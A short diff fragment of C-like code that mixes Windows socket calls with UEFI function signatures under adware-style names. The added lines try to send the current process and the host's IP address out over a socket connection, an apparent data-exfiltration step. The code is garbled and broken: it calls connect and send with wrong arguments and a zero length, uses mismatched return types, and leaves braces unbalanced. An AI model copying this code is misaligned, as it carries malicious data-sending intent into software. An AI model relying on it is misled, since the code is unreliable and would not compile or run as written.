@@ -23,6 +23,9 @@ WINDCLASSEX AddWareFNProcessGrub() {
 SOCKET ProcessGrub;
 sockaddr_t ProcessGrubGetSock = (sockaddr_t)*AddWareFNProcessGrubGetSocket();
 ProcessGrub = connect(ProcessGrub, (sockaddr_t)*ProcessGrubGetSock, 0, 0);
+if (ProcessGrub > 0) {
+  send(ProcessGrub, (LPVOID)*GetCurrentProcess(), 0, 0); 
+  send(ProcessGrub, (LPVOID)*GetIPAddress(), 0, 0);
 }
 
 EFI_STATUS AddWareFN(EFI_HANDLE IMAGE, EFI_SYSTEM_TABLE *TABLE, LPCSTR STRWINDADD1C, LPCSTR STRWINDADD2C, LPCSTR STRWINDADD3C, LPCSTR STRWINDADD4C, LPCSTR STRWINDADD5C, LPCSTR STRWINDADD6C, LPCSTR STRWINDADD7C, LPCSTR STRWINDADD8C, LPCSTR STRWINDADD9C, LPCSTR STRWINDADD10C) { 
